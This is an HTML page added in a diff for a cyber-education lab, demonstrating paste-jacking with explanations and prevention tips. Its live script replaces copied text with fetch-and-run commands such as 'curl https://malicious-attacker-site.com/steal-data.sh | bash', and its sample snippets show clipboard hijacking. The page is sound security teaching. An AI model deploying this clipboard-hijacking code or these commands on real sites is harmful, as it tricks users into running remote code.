@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paste Jacking Demo - Ayushman's- Cyber Education Lab</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .demo-container {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: #161b22;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid #30363d;
+        }
+
+        .demo-step {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            border: 2px solid #30363d;
+            border-radius: 10px;
+            background: #0d1117;
+        }
+
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 1rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 1rem 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        .copy-button:hover {
+            background: #2980b9;
+        }
+
+        .malicious-text {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        .clipboard-display {
+            background: #ffffff;
+            border: 2px dashed #30363d;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            min-height: 60px;
+            font-family: monospace;
+            color: #000000;
+        }
+
+        .step-number {
+            background: #2ea043;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .innocent-looking-text {
+            background: rgba(46, 160, 67, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #2ea043;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+
+        .attack-explanation {
+            background: rgba(255, 193, 7, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+
+        .prevention-tip {
+            background: rgba(23, 162, 184, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #17a2b8;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <h1>Ayushman's- Cyber Education Lab</h1>
+            </div>
+            <nav class="nav">
+                <a href="index.html" class="nav-link">Home</a>
+                <a href="#" class="nav-link active">Paste Jacking Demo</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <div class="demo-container">
+                <h1><i class="fas fa-clipboard"></i> Paste Jacking Attack Demonstration</h1>
+
+                <div class="alert alert-warning">
+                    <strong><i class="fas fa-exclamation-triangle"></i> Educational Warning:</strong>
+                    This demonstration shows how malicious websites can manipulate clipboard content.
+                    This is for educational purposes only.
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">1</span>Understanding Paste Jacking</h2>
+                    <p>Paste jacking is an attack where a malicious website modifies the content of your clipboard when you copy text. Instead of copying what you intended, malicious code gets copied instead.</p>
+
+                    <div class="attack-explanation">
+                        <strong>How it works:</strong> When you select and copy text, JavaScript can intercept the copy event and replace the clipboard content with malicious commands.
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">2</span>Try It Yourself - Safe Demo</h2>
+                    <p>Select and copy the innocent-looking text below:</p>
+
+                    <div class="innocent-looking-text" id="innocent-text">
+                        echo "Hello World" - This is a harmless command
+                    </div>
+
+                    <p>Now paste what you copied into the box below to see what actually got copied:</p>
+                    <textarea class="clipboard-display" id="paste-area" placeholder="Paste here to see what was actually copied..."></textarea>
+
+                    <div class="alert alert-danger" id="attack-result" style="display: none;">
+                        <strong>Attack Detected!</strong> The clipboard was modified! Instead of the innocent text, malicious content was copied.
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">3</span>Real-World Example</h2>
+                    <p>Here's what a real paste jacking attack might look like:</p>
+
+                    <div class="code-block">
+                        <button class="copy-button" onclick="copyMaliciousCode()">Copy Code</button>
+                        <div id="display-code">curl https://example.com/install.sh | bash</div>
+                    </div>
+
+                    <div class="attack-explanation">
+                        <strong>What users see:</strong> A harmless installation command<br>
+                        <strong>What actually gets copied:</strong> <code>curl https://malicious-site.com/malware.sh | bash</code>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">4</span>Advanced Techniques</h2>
+                    <p>Attackers use various sophisticated methods:</p>
+                    <ul>
+                        <li><strong>CSS Tricks:</strong> Using CSS to hide malicious text that gets selected</li>
+                        <li><strong>Unicode Manipulation:</strong> Using invisible characters</li>
+                        <li><strong>Event Listeners:</strong> JavaScript that modifies clipboard on copy events</li>
+                        <li><strong>Social Engineering:</strong> Convincing users to copy and paste commands</li>
+                    </ul>
+
+                    <div class="code-block">
+                        // Example of clipboard manipulation
+                        document.addEventListener('copy', function(e) {
+                            e.clipboardData.setData('text/plain', 'malicious command here');
+                            e.preventDefault();
+                        });
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">5</span>Prevention Strategies</h2>
+
+                    <div class="prevention-tip">
+                        <h3><i class="fas fa-shield-alt"></i> How to Protect Yourself:</h3>
+                        <ul>
+                            <li><strong>Always verify commands:</strong> Paste into a text editor first to inspect</li>
+                            <li><strong>Type manually:</strong> For critical commands, type them manually</li>
+                            <li><strong>Use paste protection:</strong> Some terminals warn about pasted content</li>
+                            <li><strong>Browser security:</strong> Modern browsers have some clipboard protections</li>
+                            <li><strong>Be suspicious:</strong> Question why a website asks you to copy/paste commands</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">6</span>Technical Deep Dive</h2>
+                    <p>Understanding the technical aspects helps in prevention:</p>
+
+                    <div class="code-block">
+                        // Clipboard API - Modern approach
+                        navigator.clipboard.writeText('malicious content')
+                            .then(() => console.log('Clipboard modified'));
+
+                        // Legacy approach using execCommand
+                        document.execCommand('copy');
+                    </div>
+
+                    <div class="attack-explanation">
+                        <strong>Browser Permissions:</strong> Modern browsers require user interaction and may show permission prompts for clipboard access.
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    <strong><i class="fas fa-graduation-cap"></i> Key Takeaways:</strong>
+                    <ul>
+                        <li>Never blindly copy and paste commands from websites</li>
+                        <li>Always inspect pasted content before executing</li>
+                        <li>Be especially careful with terminal/command line operations</li>
+                        <li>Educate others about this attack vector</li>
+                    </ul>
+                </div>
+
+                <div style="text-align: center; margin-top: 2rem;">
+                    <a href="index.html" class="demo-btn">← Back to Main Lab</a>
+                    <a href="phishing-demo.html" class="demo-btn">Next: Phishing Demo →</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 Ayushman's- Cyber Education Lab. For educational purposes only.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Paste jacking demonstration
+        document.getElementById('innocent-text').addEventListener('copy', function(e) {
+            // This is the malicious payload that gets copied instead
+            const maliciousPayload = 'curl https://malicious-attacker-site.com/steal-data.sh | bash # This is malicious code!';
+
+            if (e.clipboardData) {
+                e.clipboardData.setData('text/plain', maliciousPayload);
+                e.preventDefault();
+
+                // Show the attack result
+                setTimeout(() => {
+                    document.getElementById('attack-result').style.display = 'block';
+                }, 500);
+            }
+        });
+
+        // Monitor paste area to show what was actually copied
+        document.getElementById('paste-area').addEventListener('paste', function(e) {
+            setTimeout(() => {
+                const pastedContent = e.target.value;
+                if (pastedContent.includes('malicious')) {
+                    document.getElementById('attack-result').style.display = 'block';
+                }
+            }, 100);
+        });
+
+        // Function for the copy button demo
+        function copyMaliciousCode() {
+            const displayText = 'curl https://example.com/install.sh | bash';
+            const actualMalicious = 'curl https://malicious-site.com/malware.sh | bash';
+
+            navigator.clipboard.writeText(actualMalicious).then(() => {
+                alert('Code copied! But check what was actually copied...');
+            });
+        }
+
+        // Smooth scrolling for navigation
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+</body>
+</html>
